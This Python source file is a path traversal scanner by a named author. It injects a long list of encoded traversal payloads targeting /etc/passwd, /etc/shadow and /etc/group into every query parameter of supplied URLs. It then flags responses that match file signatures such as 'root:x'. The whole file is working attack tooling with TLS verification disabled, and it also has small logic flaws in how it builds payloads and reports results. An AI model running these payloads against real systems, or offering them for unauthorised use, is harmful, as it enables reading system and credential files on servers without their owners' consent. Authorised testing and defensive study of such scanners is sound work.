import argparse
import requests
import os
import socket
import time
from urllib.parse import urlparse
from termcolor import colored
from colorama import init

# Initialize colorama
init(autoreset=True)

# Print header with your name
def print_header():
    print("""
   |  _ \\ __ _| |_| |_ ___ _ __ | |_ _ __ ___
   | |_) / _` | __| __/ _ \\ '_ \\| __| '__/ _ \\
   |  __/ (_| | |_| ||  __/ | | | |_| | | (_) |
   |_|   \\__,_|\\__|\\__\\___|_| |_|\\__|_|  \\___/

          Path Traversal Scanner Tool
          By: Mrutunjaya Senapati
    """)

# Default payloads for Path Traversal
default_payloads = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
    "..%2fetc/passwd",
    "%2Fetc%2Fpasswd",
    "..%2f..%2fetc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "..%252fetc/passwd",
    "..%252f..%252fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..%252f..%252f..%252f..%252fetc/passwd",
    "..%252f..%252f..%252f..%252f..%252fetc/passwd",
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
    "..%c0%afetc/passwd",
    "..%c0%af..%c0%afetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "....//etc/passwd",
    "....//....//etc/passwd",
    "....//....//....//etc/passwd",
    "....//....//....//....//etc/passwd",
    "..\\etc/passwd",
    "..\\..\\etc/passwd",
    "..\\..\\..\\etc/passwd",
    "..\\..\\..\\..\\etc/passwd",
    "..\\..\\..\\..\\..\\etc/passwd",
    "..%5cetc/passwd",
    "..%5c..%5cetc/passwd",
    "..%5c..%5c..%5cetc/passwd",
    "..%5c..%5c..%5c..%5cetc/passwd",
    "..%5c..%5c..%5c..%5c..%5cetc/passwd",
    "..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
    "%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e\\%2e%2e\\etc\\passwd",
    "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd",
    "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd",
    "..%00/etc/passwd",
    "..%00..%00/etc/passwd",
    "..%00..%00..%00/etc/passwd",
    "..%00..%00..%00..%00/etc/passwd",
    "..%e0%80%afetc/passwd",
    "..%e0%80%af..%e0%80%afetc/passwd",
    "..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd",
    "../../etc/group",
    "../../../etc/group",
    "../../../../etc/group",
    "..%2fetc/group",
    "..%2f..%2fetc/group",
    "..%252fetc/group",
    "..%c0%afetc/group",
    "....//etc/group",
    "..\\etc\\group",
    "..\\..\\etc\\group",
    "..%5cetc/group",
    "..%5c..%5cetc/group",
    "%2e%2e/%2e%2e/etc/group",
    "%2e%2e\\%2e%2e\\etc\\group",
    "..%00/etc/group",
    "..%00..%00/etc/group",
    "..%e0%80%afetc/group",
    "../../etc/shadow",
    "../../../etc/shadow",
    "../../../../etc/shadow",
    "..%2fetc/shadow",
    "..%2f..%2fetc/shadow",
    "..%252fetc/shadow",
    "..%c0%afetc/shadow",
    "....//etc/shadow",
    "..\\etc\\shadow",
    "..\\..\\etc\\shadow",
    "..%5cetc\\shadow",
    "..%5c..%5cetc\\shadow",
    "%2e%2e/%2e%2e/etc/shadow",
    "%2e%2e\\%2e%2e\\etc\\shadow",
    "..%00/etc/shadow",
    "..%00..%00/etc/shadow",
    "..%e0%80%afetc/shadow",
    "%2e%2e/%2e%2e\\%2e%2e\\etc\\group",
    "..%2f..%2f..%2f..%2f..%2f/etc/passwd",
    "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..\\..\\..\\..\\..\\..\\etc\\passwd",
    "....//etc/passwd",
    "..%c0%af..%c0%afetc%252fpasswd",
    "..\\..\\..\\..\\etc\\passwd",
    "..%2f..%2f..%2f..%2f/etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f/etc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%00..%00etc%5cpasswd",
    "..%00etc%252fpasswd",
    "..%c0%afetc%5cpasswd",
    "..%c0%af..%c0%afetc%5cpasswd",
    "..\\..\\etc\\passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "..\\..\\..\\..\\etc\\passwd",
    "..%c0%af..%c0%afetc%252fpasswd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%252fpasswd",
    "..\\..\\..\\etc\\passwd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc\\passwd",
    "..%c0%af..%c0%afetc\\passwd",
    "..%2f..%2f..%2f..%2fetc\\passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e\\etc\\passwd",
    "..\\..\\..\\etc\\passwd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc\\passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..\\..\\..\\..\\..\\etc\\passwd",
    "%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e\\etc\\passwd",
    "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd",
    "..%252f..%252f..%252f..%252f..%252fetc\\passwd",
    "..%00..%00..%00etc\\passwd",
    "..%c0%afetc\\passwd",
    "%2e%2e/%2e%2e/etc/shadow",
    "..%5c..%5cetc\\passwd",
    "..\\..\\..\\etc\\passwd",
    "....//etc/shadow",
    "%c0%afetc%5cpasswd",
    "%2e%2e/%2e%2e/etc/shadow",
    "..\\..\\..\\etc\\shadow",
    "..%5c..%5cetc\\shadow",
    "..\\..\\etc\\passwd"
]

# Results directory
os.makedirs("results", exist_ok=True)
vuln_file = "results/vulnerable_paths.txt"
log_file = "results/response_logs.txt"

# Check internet connectivity
def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except OSError:
        return False

# Get payloads from file or default
def get_payloads(file=None):
    if file:
        try:
            with open(file, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print("[!] Payload file not found. Using default payloads.")
    return default_payloads

# Check if response shows signs of LFI (Local File Inclusion)
lfi_signatures = ["root:x", "/bin/bash", "[boot]", ":/home", ":/bin/sh"]
def is_vulnerable(response_text):
    for sig in lfi_signatures:
        if sig.lower() in response_text.lower():
            return True
    return False

# Save vulnerable URL to file
def save_finding(url):
    with open(vuln_file, "a", encoding="utf-8") as f:
        f.write(url + "\n")

# Save full response or error log
def log_response(url, response_text=None, error=None):
    with open(log_file, "a", encoding="utf-8", errors="ignore") as f:
        if error:
            f.write(f"[!] Error on: {url}\n{error}\n\n")
        else:
            f.write(f"[🌐] Response from: {url}\n{response_text[:1000]}\n{'-'*40}\n\n")

# Scan a single URL
def scan_url(base_url, payloads, timeout):
    parsed = urlparse(base_url)

    # Extract query parameters
    query = parsed.query
    if "=" not in query:
        print(colored(f"[!] Skipping invalid URL (no param): {base_url}", "yellow"))
        return

    query_params = query.split("&")

    for payload in payloads:
        for param in query_params:
            if "=" not in param:
                print(colored(f"[!] Skipping invalid param: {param}", "yellow"))
                continue

            key, value = param.split("=")
            new_value = value[:len(value)//2] + payload + value[len(value)//2:]
            test_url = base_url.replace(f"{key}={value}", f"{key}={new_value}")

            print(colored(f"[🌐] Testing: {test_url}", "yellow"))

            try:
                r = requests.get(test_url, timeout=timeout, verify=False)
                log_response(test_url, r.text)

                if is_vulnerable(r.text):
                    print(colored(f"[🚨] Vulnerable: {test_url}", "red"))
                    save_finding(test_url)
                    break
            except requests.RequestException as e:
                print(colored(f"[!] Error on: {test_url}", "magenta"))
                log_response(test_url, error=str(e))
                continue
    else:
        print(colored(f"[✅] Not Vulnerable: {base_url}", "green"))

# Argument parser
parser = argparse.ArgumentParser(description="Path Traversal Scanner Tool")
parser.add_argument("-u", help="Single URL to scan")
parser.add_argument("-l", help="List of URLs to scan")
parser.add_argument("-p", help="Payload file path")
parser.add_argument("-t", "--max-timeout", type=int, default=10, help="Maximum timeout in seconds per request (default: 10)")
args = parser.parse_args()

# Print the header
print_header()

# Wait for internet
while not is_connected():
    print("[!] No internet. Retrying in 10 seconds...")
    time.sleep(10)

payloads = get_payloads(args.p)

# Single URL
if args.u:
    print(f"[INFO] Scanning single URL: {args.u}")
    scan_url(args.u, payloads, args.max_timeout)

# List of URLs
if args.l:
    try:
        with open(args.l, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                url = line.strip()
                if url:
                    print(f"[INFO] Scanning URL from list: {url}")
                    scan_url(url, payloads, args.max_timeout)
    except FileNotFoundError:
        print("[!] URL list file not found.")

print(colored("[✔] Scan complete. Results saved in 'results' folder.", "cyan"))
